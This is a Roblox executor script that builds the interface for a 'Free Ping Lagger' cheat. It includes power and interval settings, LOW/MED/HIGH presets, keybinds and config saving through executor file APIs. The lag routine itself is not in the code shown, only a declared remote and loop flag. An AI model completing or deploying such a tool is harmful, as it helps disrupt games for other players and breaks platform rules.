local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local plr = Players.LocalPlayer
local plrGui = plr:WaitForChild("PlayerGui")

local CONFIG_FILE = "exe_drakau_pinger.json"
local DEFAULT_CFG = {
    power        = 100000,
    power1       = 100000,
    power2       = 75000,
    interval1     = 0.13,
    interval2     = 0.125,
    activePower  = 1,
    interval     = 0.13,
    keybindKb    = "F",
    keybindGp    = "ButtonR2",
    autoBrainrot = false,
}
local savedUi = {}
local bgIndex = 1 -- fixed background
local colorIndex = 1
local customStroke = nil
local captureUiState

local cfg = {
    power        = DEFAULT_CFG.power,
    power1       = DEFAULT_CFG.power1,
    power2       = DEFAULT_CFG.power2,
    interval1     = DEFAULT_CFG.interval1,
    interval2     = DEFAULT_CFG.interval2,
    activePower  = DEFAULT_CFG.activePower,
    interval     = DEFAULT_CFG.interval,
    keybindKb    = DEFAULT_CFG.keybindKb,
    keybindGp    = DEFAULT_CFG.keybindGp,
    autoBrainrot = DEFAULT_CFG.autoBrainrot,
    selectedPreset = nil,
}

local function resolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end


local function saveConfig()
    if captureUiState then pcall(captureUiState) end
    cfg.power = tonumber(cfg.power1) or cfg.power or 100000
    cfg.interval = tonumber(cfg.interval1) or cfg.interval or 0.13
    local data = {
        power = cfg.power,
        power1 = cfg.power1,
        power2 = cfg.power2,
        interval1 = cfg.interval1,
        interval2 = cfg.interval2,
        activePower = 1,
        interval = cfg.interval,
        keybindKb = cfg.keybindKb,
        keybindGp = cfg.keybindGp,
        autoBrainrot = cfg.autoBrainrot,
        selectedPreset = cfg.selectedPreset,
        ui = savedUi,
    }
    local ok, encoded = pcall(function()
        return HttpService:JSONEncode(data)
    end)
    if not ok or not encoded then
        warn("[EXE] save encode failed")
        return
    end
    -- try multiple FS APIs used by different executors
    local saved = false
    pcall(function()
        if writefile then
            writefile(CONFIG_FILE, encoded)
            saved = true
        end
    end)
    pcall(function()
        if not saved and writefile then
            writefile("ExeDrakau/" .. CONFIG_FILE, encoded)
            saved = true
        end
    end)
    pcall(function()
        if makefolder then pcall(makefolder, "ExeDrakau") end
        if writefile then
            writefile("ExeDrakau/" .. CONFIG_FILE, encoded)
            saved = true
        end
    end)
    -- session backup
    pcall(function()
        if getgenv then
            getgenv().ExeDrakauPingerConfig = data
        end
    end)
    if saved then
        print("[EXE] Config saved | power=" .. tostring(cfg.power) .. " interval=" .. tostring(cfg.interval) .. " preset=" .. tostring(cfg.selectedPreset))
    else
        warn("[EXE] writefile not available — session backup only")
    end
end

local function loadConfig()
    local data = nil
    -- 1) file
    pcall(function()
        if isfile and readfile then
            if isfile(CONFIG_FILE) then
                data = HttpService:JSONDecode(readfile(CONFIG_FILE))
            elseif isfile("ExeDrakau/" .. CONFIG_FILE) then
                data = HttpService:JSONDecode(readfile("ExeDrakau/" .. CONFIG_FILE))
            end
        end
    end)
    -- 2) session
    if type(data) ~= "table" then
        pcall(function()
            if getgenv and type(getgenv().ExeDrakauPingerConfig) == "table" then
                data = getgenv().ExeDrakauPingerConfig
            end
        end)
    end
    if type(data) ~= "table" then return end
    savedUi = type(data.ui) == "table" and data.ui or {}
    cfg.power1 = tonumber(data.power1) or tonumber(data.power) or DEFAULT_CFG.power1
    cfg.power2 = tonumber(data.power2) or DEFAULT_CFG.power2
    cfg.interval1 = tonumber(data.interval1) or tonumber(data.interval) or DEFAULT_CFG.interval1
    cfg.interval2 = tonumber(data.interval2) or DEFAULT_CFG.interval2
    cfg.activePower = 1
    cfg.power = cfg.power1
    cfg.interval = cfg.interval1
    cfg.keybindKb = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
    cfg.keybindGp = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
    if type(data.autoBrainrot) == "boolean" then cfg.autoBrainrot = data.autoBrainrot end
    cfg.selectedPreset = type(data.selectedPreset) == "string" and data.selectedPreset or nil
    print("[EXE] Config loaded | power=" .. tostring(cfg.power) .. " interval=" .. tostring(cfg.interval) .. " preset=" .. tostring(cfg.selectedPreset))
end

loadConfig()


local active = false
local activePowerButton, backupPowerButton, profileLabel
local primaryLed, backupLed
local refreshPowerRows
local powerBox, delayBox1, backupPowerBox, delayBox2
local listeningFor = nil
local remote = nil
local brainrotMode = false
local lastBrainrotState = false
local manualOverride = false
local pingLoopRunning = false
local applyAccentColors

-- Black / White / Gray theme
local THEME_ACCENT = Color3.fromRGB(180, 180, 190)   -- mid gray accent
local THEME_TEXT   = Color3.fromRGB(245, 245, 245)   -- near white text
local THEME_STROKE = Color3.fromRGB(220, 220, 230)   -- light gray stroke
local THEME_DARK   = Color3.fromRGB(12, 12, 16)      -- near black
local THEME_ROW    = Color3.fromRGB(30, 30, 36)      -- dark gray rows
local THEME_BOX    = Color3.fromRGB(22, 22, 28)      -- darker boxes
local NEON_GREEN   = Color3.fromRGB(200, 200, 210)   -- light gray (compat name)
local NEON_DIM     = Color3.fromRGB(60, 60, 70)

local IMAGES = {
    { id = "rbxassetid://140145334415261", name = "Img1" },
    { id = "rbxassetid://70585772187354",  name = "Img2" },
    { id = "rbxassetid://139321042825616", name = "Img3" },
    { id = "rbxassetid://116890020704841", name = "Img4" },
    { id = "rbxassetid://126519267203224", name = "Img5" },
    { id = "rbxassetid://73290556702979",  name = "Img6" },
}
local BG_LIST = {}
for _, im in ipairs(IMAGES) do
    table.insert(BG_LIST, { name = im.name, id = im.id, accent = THEME_ACCENT, text = THEME_TEXT, stroke = THEME_STROKE })
end

local COLOR_OPTIONS = {
    Color3.fromRGB(255, 255, 255), Color3.fromRGB(220, 220, 220), Color3.fromRGB(180, 180, 180),
    Color3.fromRGB(140, 140, 140), Color3.fromRGB(100, 100, 100), Color3.fromRGB(70, 70, 70),
    Color3.fromRGB(40, 40, 40), Color3.fromRGB(200, 200, 210), Color3.fromRGB(160, 160, 170),
}
local function getEntry()
    local i = tonumber(bgIndex) or 1
    if i < 1 then i = 1 end
    if i > #BG_LIST then i = #BG_LIST end
    return BG_LIST[i]
end
local function getBgId()    return getEntry().id end
local function getBgName()  return getEntry().name end
local function getAccent()  return THEME_ACCENT end
local function getText()    return THEME_TEXT end
local function getStroke()  return customStroke or THEME_STROKE end

for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "ExeDrakauPingGui" or kid.Name == "ExeDrakauIntro" then
        kid:Destroy()
    end
end

local function tw(obj, props, t)
    TweenService:Create(obj, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

local function makeDraggable(frame, lockFlag)
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(i)
        if lockFlag and lockFlag() then return end
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = i.Position
            startPos = frame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    if captureUiState then captureUiState(); saveConfig() end
                end
            end)
        end
    end)
    frame.InputChanged:Connect(function(i)
        if lockFlag and lockFlag() then dragging = false; return end
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

local function isGamepadKeyCode(kc)
    if not kc then return false end
    local name = kc.Name
    return name:find("Button") == 1 or name == "DPadUp" or name == "DPadDown" or name == "DPadLeft" or
        name == "DPadRight" or name == "ButtonSelect" or name == "ButtonStart" or name == "Thumbstick1" or name == "Thumbstick2"
end

local BLACKLISTED = {[Enum.KeyCode.Escape] = true, [Enum.KeyCode.LeftControl] = true, [Enum.KeyCode.Unknown] = true}

local WHITE = Color3.fromRGB(255,255,255)
local GREEN = Color3.fromRGB(200, 200, 210)      -- light gray for ON
local RED = Color3.fromRGB(100, 100, 110)        -- darker gray for OFF
local BRIGHT_RED = Color3.fromRGB(160, 160, 170)
local TOGGLE_OFF = Color3.fromRGB(45, 45, 50)
local TOGGLE_KNOB = Color3.fromRGB(240,240,240)
local LOCK_RED = Color3.fromRGB(90, 90, 100)
local UNLOCK_GREEN = Color3.fromRGB(160, 160, 170)

local screen = Instance.new("ScreenGui")
screen.Name = "ExeDrakauPingGui"
screen.ResetOnSpawn = false
screen.DisplayOrder = 18
screen.IgnoreGuiInset = true
local okParent = false
if gethui then okParent = pcall(function() screen.Parent = gethui() end) end
if not okParent then
    pcall(function() screen.Parent = plrGui end)
end

local uiLocked = false
local pingMinimized = false

local SCALE = 0.62
local MAIN_W = 340
local MAIN_H = 195
local MIN_HEIGHT = 28

local accent0 = getAccent()
local text0 = getText()
local stroke0 = getStroke()
local accentDim0 = accent0:Lerp(Color3.new(0,0,0), 0.4)
local rowBg0 = Color3.new(accent0.R*0.35, accent0.G*0.35, accent0.B*0.35)
local rowBoxBg0 = Color3.new(accent0.R*0.15, accent0.G*0.15, accent0.B*0.15)
local tabAct0 = Color3.new(accent0.R*0.3, accent0.G*0.3, accent0.B*0.3)
local tabInact0 = Color3.new(accent0.R*0.1, accent0.G*0.1, accent0.B*0.1)

local mainFrame = Instance.new("Frame")
mainFrame.Name = "ExeDrakauMain"
mainFrame.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
mainFrame.Position = UDim2.new(0.5, -MAIN_W/2, 0.22, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
mainFrame.BackgroundTransparency = 1
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.ClipsDescendants = true
mainFrame.Parent = screen
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 16)
local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Color = stroke0
mainStroke.Thickness = 2.5
mainStroke.Transparency = 0.15
makeDraggable(mainFrame, function() return uiLocked end)

-- Animated moving outline helper (rotating gray/white gradient on stroke)
-- Only for border UIStrokes — never for text/letter strokes
local function addMovingOutline(stroke, speed)
    if not stroke or not stroke:IsA("UIStroke") then return end
    if stroke:FindFirstChildOfClass("UIGradient") then return end -- already animated
    local grad = Instance.new("UIGradient")
    grad.Name = "MovingOutlineGrad"
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(40, 40, 50)),
        ColorSequenceKeypoint.new(0.20, Color3.fromRGB(140, 140, 150)),
        ColorSequenceKeypoint.new(0.45, Color3.fromRGB(240, 240, 250)),
        ColorSequenceKeypoint.new(0.55, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.80, Color3.fromRGB(140, 140, 150)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(40, 40, 50)),
    })
    grad.Rotation = 0
    grad.Parent = stroke
    local spd = speed or (40 + math.random(0, 30))
    task.spawn(function()
        local rot = math.random(0, 360)
        while stroke and stroke.Parent do
            rot = (rot + spd * 0.03) % 360
            grad.Rotation = rot
            task.wait(0.03)
        end
    end)
end

addMovingOutline(mainStroke, 55)

local mainBgImage = Instance.new("ImageLabel", mainFrame)
mainBgImage.Name = "MainBgImage"
mainBgImage.Size = UDim2.new(1,0,1,0)
mainBgImage.BackgroundTransparency = 1
mainBgImage.Image = getBgId()
mainBgImage.ScaleType = Enum.ScaleType.Crop
mainBgImage.ZIndex = 1
Instance.new("UICorner", mainBgImage).CornerRadius = UDim.new(0, 14)

local darkOverlay = Instance.new("Frame", mainFrame)
darkOverlay.Size = UDim2.new(1,0,1,0)
darkOverlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
darkOverlay.BackgroundTransparency = 0.55
darkOverlay.BorderSizePixel = 0
darkOverlay.ZIndex = 2
Instance.new("UICorner", darkOverlay).CornerRadius = UDim.new(0, 14)

local header = Instance.new("Frame", mainFrame)
header.Size = UDim2.new(1,0,0,28)
header.BackgroundTransparency = 1
header.BorderSizePixel = 0
header.ZIndex = 3

local titleLbl = Instance.new("TextLabel", header)
titleLbl.Size = UDim2.new(1, -100, 1, 0)
titleLbl.Position = UDim2.new(0, 12, 0, 0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text = "EXE X DRAKAU · PINGER"
titleLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLbl.Font = Enum.Font.GothamBlack
titleLbl.TextSize = 11
titleLbl.TextXAlignment = Enum.TextXAlignment.Left
titleLbl.TextStrokeTransparency = 0.4
titleLbl.TextStrokeColor3 = Color3.fromRGB(0,0,0)
titleLbl.ZIndex = 4

local function addStroke(obj, thickness, transparency)
    local s = Instance.new("UIStroke", obj)
    s.Color = stroke0
    s.Thickness = thickness or 1
    s.Transparency = transparency or 0.25
    -- Animated moving outline on every border stroke (not text/letter strokes)
    addMovingOutline(s)
    return s
end

-- Top-right controls: OFF status pill + gear (matching reference)
local statusPill = Instance.new("TextButton", header)
statusPill.Name = "statusPill"
statusPill.Size = UDim2.new(0, 52, 0, 22)
statusPill.Position = UDim2.new(1, -88, 0.5, -11)
statusPill.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
statusPill.BorderSizePixel = 0
statusPill.Text = "OFF"
statusPill.TextColor3 = Color3.fromRGB(220, 220, 220)
statusPill.Font = Enum.Font.GothamBlack
statusPill.TextSize = 10
statusPill.AutoButtonColor = false
statusPill.ZIndex = 5
Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1, 0)
local statusStroke = addStroke(statusPill, 1.2, 0.3)

local gearBtn = Instance.new("TextButton", header)
gearBtn.Name = "gearBtn"
gearBtn.Size = UDim2.new(0, 26, 0, 26)
gearBtn.Position = UDim2.new(1, -32, 0.5, -13)
gearBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
gearBtn.BorderSizePixel = 0
gearBtn.Text = "⚙"
gearBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
gearBtn.Font = Enum.Font.GothamBlack
gearBtn.TextSize = 13
gearBtn.AutoButtonColor = false
gearBtn.ZIndex = 5
Instance.new("UICorner", gearBtn).CornerRadius = UDim.new(1, 0)
addStroke(gearBtn, 1.2, 0.3)

-- Keep lock/bg hidden or for settings (compatibility)
local lockBtn = Instance.new("TextButton")
lockBtn.Visible = false
local bgBtn = Instance.new("TextButton")
bgBtn.Visible = false
local statusLbl = statusPill -- alias so old updateToggleButton still works

local mainContent = Instance.new("Frame", mainFrame)
mainContent.Name = "MainContent"
mainContent.Size = UDim2.new(1,0,1,-28)
mainContent.Position = UDim2.new(0,0,0,28)
mainContent.BackgroundTransparency = 1
mainContent.BorderSizePixel = 0
mainContent.ZIndex = 3

-- Large ACTIVATE button (pill style matching reference)
local activateBtn = Instance.new("TextButton", mainContent)
activateBtn.Name = "activateBtn"
activateBtn.Size = UDim2.new(1, -24, 0, 48)
activateBtn.Position = UDim2.new(0, 12, 0, 8)
activateBtn.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
activateBtn.BackgroundTransparency = 0.1
activateBtn.BorderSizePixel = 0
activateBtn.Text = ""
activateBtn.AutoButtonColor = false
activateBtn.ZIndex = 4
Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0, 24)
local ag = Instance.new("UIGradient", activateBtn)
ag.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(12, 12, 16)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(22, 22, 28))
})
ag.Rotation = 90
ag.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 0.25),
    NumberSequenceKeypoint.new(1, 0.25)
})
local aStroke = Instance.new("UIStroke", activateBtn)
aStroke.Color = Color3.fromRGB(180, 180, 190)
aStroke.Thickness = 1.8
aStroke.Transparency = 0.15
addMovingOutline(aStroke, 70)
local activateLbl = Instance.new("TextLabel", activateBtn)
activateLbl.Size = UDim2.new(1,0,1,0)
activateLbl.BackgroundTransparency = 1
activateLbl.Text = "ACTIVATE"
activateLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
activateLbl.Font = Enum.Font.GothamBlack
activateLbl.TextSize = 16
activateLbl.ZIndex = 5

-- ===== Main presets (outside settings) LOW / MED / HIGH =====
local mainPresetRow = Instance.new("Frame", mainContent)
mainPresetRow.Name = "MainPresetRow"
mainPresetRow.Size = UDim2.new(1, -24, 0, 36)
mainPresetRow.Position = UDim2.new(0, 12, 0, 66)
mainPresetRow.BackgroundTransparency = 1
mainPresetRow.ZIndex = 4

local function mkMainPreset(text, xScale)
    local b = Instance.new("TextButton", mainPresetRow)
    b.Size = UDim2.new(0.32, -4, 1, 0)
    b.Position = UDim2.new(xScale, 0, 0, 0)
    b.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    b.BackgroundTransparency = 0.15
    b.BorderSizePixel = 0
    b.Text = text
    b.TextColor3 = Color3.fromRGB(230, 230, 230)
    b.Font = Enum.Font.GothamBlack
    b.TextSize = 12
    b.AutoButtonColor = false
    b.ZIndex = 5
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 18)
    local st = Instance.new("UIStroke", b)
    st.Color = Color3.fromRGB(160, 160, 170)
    st.Thickness = 1.4
    st.Transparency = 0.3
    addMovingOutline(st, 50)
    return b
end

local mainLowBtn  = mkMainPreset("LOW", 0)
local mainMedBtn  = mkMainPreset("MED", 0.34)
local mainHighBtn = mkMainPreset("HIGH", 0.68)

local function applyMainPreset(powerVal, intervalVal, presetName)
    powerVal = math.floor(tonumber(powerVal) or 65000)
    intervalVal = tonumber(intervalVal) or 0.125
    if intervalVal < 0.001 then intervalVal = 0.001 end

    cfg.activePower = 1
    cfg.power1 = powerVal
    cfg.interval1 = intervalVal
    cfg.power2 = powerVal
    cfg.interval2 = intervalVal
    cfg.power = powerVal
    cfg.interval = intervalVal
    if presetName then cfg.selectedPreset = presetName end

    if powerBox then powerBox.Text = tostring(powerVal) end
    if delayBox1 then delayBox1.Text = tostring(intervalVal) end

    if refreshPowerProfile then pcall(refreshPowerProfile) end
    if refreshPowerRows then pcall(refreshPowerRows) end
    pcall(saveConfig)
end


local selectedPreset = nil
local presetTweenInfo = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

local function setPresetVisual(btn)
    for _, b in ipairs({mainLowBtn, mainMedBtn, mainHighBtn}) do
        local st = b:FindFirstChildOfClass("UIStroke")
        if b == btn then
            -- selected: bright gray fill + strong stroke
            TweenService:Create(b, presetTweenInfo, {
                BackgroundColor3 = Color3.fromRGB(90, 90, 100),
                BackgroundTransparency = 0.1,
                TextColor3 = Color3.fromRGB(255, 255, 255)
            }):Play()
            if st then
                TweenService:Create(st, presetTweenInfo, {
                    Color = Color3.fromRGB(240, 240, 250),
                    Thickness = 2.2,
                    Transparency = 0.05
                }):Play()
            end
        else
            -- unselected
            TweenService:Create(b, presetTweenInfo, {
                BackgroundColor3 = Color3.fromRGB(18, 18, 22),
                BackgroundTransparency = 0.15,
                TextColor3 = Color3.fromRGB(200, 200, 200)
            }):Play()
            if st then
                TweenService:Create(st, presetTweenInfo, {
                    Color = Color3.fromRGB(160, 160, 170),
                    Thickness = 1.4,
                    Transparency = 0.35
                }):Play()
            end
        end
    end
    selectedPreset = btn
end

mainLowBtn.MouseButton1Click:Connect(function()
    applyMainPreset(65000, 0.125, "LOW")
    setPresetVisual(mainLowBtn)
end)
mainMedBtn.MouseButton1Click:Connect(function()
    applyMainPreset(85000, 0.125, "MED")
    setPresetVisual(mainMedBtn)
end)
mainHighBtn.MouseButton1Click:Connect(function()
    applyMainPreset(100000, 0.13, "HIGH")
    setPresetVisual(mainHighBtn)
end)

-- Footer text matching reference style
local footerLbl = Instance.new("TextLabel", mainContent)
footerLbl.Size = UDim2.new(1, -20, 0, 16)
footerLbl.Position = UDim2.new(0, 10, 1, -22)
footerLbl.BackgroundTransparency = 1
footerLbl.Text = "Exe X Drakau · Free Ping Lagger"
footerLbl.TextColor3 = Color3.fromRGB(140, 140, 150)
footerLbl.Font = Enum.Font.Gotham
footerLbl.TextSize = 9
footerLbl.TextXAlignment = Enum.TextXAlignment.Center
footerLbl.TextTransparency = 0.25
footerLbl.ZIndex = 4

local function updateToggleButton()
    if refreshPowerRows then refreshPowerRows() end
    if active then
        activateLbl.Text = "ACTIVATED"
        aStroke.Transparency = 0.05
        aStroke.Color = Color3.fromRGB(220, 220, 230)
        ag.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 58)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(90, 90, 100))
        })
        statusPill.Text = "ON"
        statusPill.TextColor3 = Color3.fromRGB(240, 240, 250)
        statusPill.BackgroundColor3 = Color3.fromRGB(50, 50, 58)
    else
        activateLbl.Text = "ACTIVATE"
        aStroke.Transparency = 0.15
        aStroke.Color = Color3.fromRGB(180, 180, 190)
        ag.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(12, 12, 16)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(22, 22, 28))
        })
        statusPill.Text = "OFF"
        statusPill.TextColor3 = Color3.fromRGB(180, 180, 190)
        statusPill.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    end
end

local SET_W, SET_H = 340, 240
local settingsFrame = Instance.new("Frame")
settingsFrame.Name = "ExeDrakauSettings"
settingsFrame.Size = UDim2.new(0, SET_W, 0, SET_H)
settingsFrame.Position = UDim2.new(0.5, -SET_W/2, 0.22, MAIN_H + 12)
settingsFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
settingsFrame.BackgroundTransparency = 1
settingsFrame.BorderSizePixel = 0
settingsFrame.Active = true
settingsFrame.ClipsDescendants = true
settingsFrame.Visible = false
settingsFrame.ZIndex = 20
settingsFrame.Parent = screen
Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0, 16)
local ss = Instance.new("UIStroke", settingsFrame)
ss.Color = stroke0
ss.Thickness = 2.5
ss.Transparency = 0.15
makeDraggable(settingsFrame)
addMovingOutline(ss, 40)

captureUiState = function()
    local function posOf(obj)
        return {xs=obj.Position.X.Scale, xo=obj.Position.X.Offset, ys=obj.Position.Y.Scale, yo=obj.Position.Y.Offset}
    end
    savedUi.bgIndex = bgIndex
    savedUi.colorIndex = colorIndex
    if customStroke then savedUi.customStroke = {customStroke.R, customStroke.G, customStroke.B} else savedUi.customStroke = nil end
    savedUi.mainPos = posOf(mainFrame)
    savedUi.settingsPos = posOf(settingsFrame)
end

local function restorePos(obj, value)
    if type(value) == "table" then
        obj.Position = UDim2.new(tonumber(value.xs) or obj.Position.X.Scale, tonumber(value.xo) or obj.Position.X.Offset, tonumber(value.ys) or obj.Position.Y.Scale, tonumber(value.yo) or obj.Position.Y.Offset)
    end
end
restorePos(mainFrame, savedUi.mainPos)
restorePos(settingsFrame, savedUi.settingsPos)

local settingsBgImage = Instance.new("ImageLabel", settingsFrame)
settingsBgImage.Name = "SettingsBgImage"
settingsBgImage.Size = UDim2.new(1,0,1,0)
settingsBgImage.BackgroundTransparency = 1
settingsBgImage.Image = getBgId()
settingsBgImage.ScaleType = Enum.ScaleType.Crop
settingsBgImage.ZIndex = 1
Instance.new("UICorner", settingsBgImage).CornerRadius = UDim.new(0, 14)

local settingsOverlay = Instance.new("Frame", settingsFrame)
settingsOverlay.Size = UDim2.new(1,0,1,0)
settingsOverlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
settingsOverlay.BackgroundTransparency = 0.3
settingsOverlay.BorderSizePixel = 0
settingsOverlay.ZIndex = 2
Instance.new("UICorner", settingsOverlay).CornerRadius = UDim.new(0, 14)

local setHeader = Instance.new("Frame", settingsFrame)
setHeader.Size = UDim2.new(1,0,0,22)
setHeader.BackgroundTransparency = 1
setHeader.BorderSizePixel = 0
setHeader.ZIndex = 21
local setTitle = Instance.new("TextLabel", setHeader)
setTitle.Size = UDim2.new(1,-30,1,0)
setTitle.Position = UDim2.new(0,8,0,0)
setTitle.BackgroundTransparency = 1
setTitle.Text = "EXE X DRAKAU · SETTINGS"
setTitle.TextColor3 = Color3.fromRGB(255,255,255)
setTitle.Font = Enum.Font.GothamBlack
setTitle.TextSize = 8
setTitle.TextXAlignment = Enum.TextXAlignment.Left
setTitle.TextStrokeTransparency = 0.35
setTitle.TextStrokeColor3 = Color3.fromRGB(0,0,0)
setTitle.ZIndex = 22
local setCloseBtn = Instance.new("TextButton", setHeader)
setCloseBtn.Name = "setCloseBtn"
setCloseBtn.Size = UDim2.new(0,16,0,16)
setCloseBtn.Position = UDim2.new(1,-20,0.5,-8)
setCloseBtn.BackgroundColor3 = rowBg0
setCloseBtn.Text = "X"
setCloseBtn.TextColor3 = text0
setCloseBtn.Font = Enum.Font.GothamBlack
setCloseBtn.TextSize = 9
setCloseBtn.ZIndex = 23
setCloseBtn.BorderSizePixel = 0
Instance.new("UICorner", setCloseBtn).CornerRadius = UDim.new(0, 4)
addStroke(setCloseBtn)
setCloseBtn.MouseButton1Click:Connect(function()
    settingsFrame.Visible = false
end)

local tabBar = Instance.new("Frame", settingsFrame)
tabBar.Size = UDim2.new(1,-12,0,20)
tabBar.Position = UDim2.new(0,6,0,24)
tabBar.BackgroundTransparency = 1
tabBar.ZIndex = 21
local tabLayout = Instance.new("UIListLayout", tabBar)
tabLayout.FillDirection = Enum.FillDirection.Horizontal
tabLayout.Padding = UDim.new(0, 4)
tabLayout.SortOrder = Enum.SortOrder.LayoutOrder

local function mkTab(text, order)
    local btn = Instance.new("TextButton", tabBar)
    btn.Size = UDim2.new(0, 68, 0, 20)
    btn.BackgroundColor3 = tabInact0
    btn.BorderSizePixel = 0
    btn.Text = text
    btn.TextColor3 = text0
    btn.Font = Enum.Font.GothamBlack
    btn.TextSize = 9
    btn.AutoButtonColor = false
    btn.LayoutOrder = order
    btn.ZIndex = 22
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
    addStroke(btn)
    return btn
end

local tabPower = mkTab("POWER", 1)
tabPower.Visible = false
local tabSettings = mkTab("SETTINGS", 2)
tabSettings.Visible = false

local pagesFrame = Instance.new("Frame", settingsFrame)
pagesFrame.Size = UDim2.new(1,-12,1,-40)
pagesFrame.Position = UDim2.new(0,6,0,28)
pagesFrame.BackgroundTransparency = 1
pagesFrame.ZIndex = 21

local powerPage = Instance.new("Frame", pagesFrame)
powerPage.Size = UDim2.new(1,0,1,0)
powerPage.BackgroundTransparency = 1
powerPage.ZIndex = 21
powerPage.Visible = true

local settingsPage = Instance.new("Frame", pagesFrame)
settingsPage.Size = UDim2.new(1,0,1,0)
settingsPage.BackgroundTransparency = 1
settingsPage.ZIndex = 21
settingsPage.Visible = false

local configPage = Instance.new("Frame") -- removed tab (dummy)
configPage.Visible = false


local function selectTab(which)
    powerPage.Visible = true
    settingsPage.Visible = true
    if tabPower then tabPower.Visible = false end
    if tabSettings then tabSettings.Visible = false end
    if tabBar then tabBar.Visible = false end
end

-- MERGED: single page (no tabs)
pcall(function()
    if tabBar then tabBar.Visible = false end
    if tabPower then tabPower.Visible = false end
    if tabSettings then tabSettings.Visible = false end
    powerPage.Visible = true
    settingsPage.Visible = true
    -- stack settings under power content
    settingsPage.Position = UDim2.new(0, 0, 0, 90)
    powerPage.Position = UDim2.new(0, 0, 0, 0)
    -- enlarge settings window for merged content
end)

local function mkRow(parent, y, label, valueText)
    local row = Instance.new("Frame", parent)
    row.Size = UDim2.new(1,0,0,25)
    row.Position = UDim2.new(0,0,0,y)
    row.BackgroundColor3 = rowBg0
    row.BackgroundTransparency = 0
    row.BorderSizePixel = 0
    row.ZIndex = 22
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)
    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.5,0,1,0)
    lbl.Position = UDim2.new(0,8,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.TextColor3 = text0
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 10
    lbl.TextStrokeTransparency = 0.4
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 23
    local box = Instance.new("TextBox", row)
    box.Size = UDim2.new(0,84,0,18)
    box.Position = UDim2.new(1,-92,0.5,-9)
    box.BackgroundColor3 = rowBoxBg0
    box.BackgroundTransparency = 0
    box.BorderSizePixel = 0
    box.Text = valueText
    box.TextColor3 = stroke0
    box.Font = Enum.Font.GothamBold
    box.TextSize = 9
    box.ClearTextOnFocus = false
    box.ZIndex = 24
    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 4)
    addStroke(box, 1, 0.3)
    return box
end

powerBox = mkRow(powerPage, 2, "POWER", tostring(cfg.power1))
delayBox1 = mkRow(powerPage, 31, "INTERVAL", tostring(cfg.interval1))
backupPowerBox = nil -- removed BACKUP
delayBox2 = nil -- removed BACKUP
refreshPowerRows = function()
    if not powerBox or not delayBox1 then return end
    local p1On = active
    local onColor = Color3.fromRGB(60, 60, 70)
    local offColor = rowBg0
    local p1Row, s1Row = powerBox.Parent, delayBox1.Parent
    if p1Row then p1Row.BackgroundColor3 = p1On and onColor or offColor end
    if s1Row then s1Row.BackgroundColor3 = p1On and onColor or offColor end
    powerBox.TextColor3 = p1On and Color3.fromRGB(0,0,0) or getStroke()
    delayBox1.TextColor3 = p1On and Color3.fromRGB(0,0,0) or getStroke()
end
local function refreshPowerProfile()
    cfg.activePower = 1
    cfg.power = cfg.power1
    cfg.interval = cfg.interval1
    if powerBox then powerBox.Text = tostring(cfg.power1) end
    if delayBox1 then delayBox1.Text = tostring(cfg.interval1) end
    if refreshPowerRows then refreshPowerRows() end
end
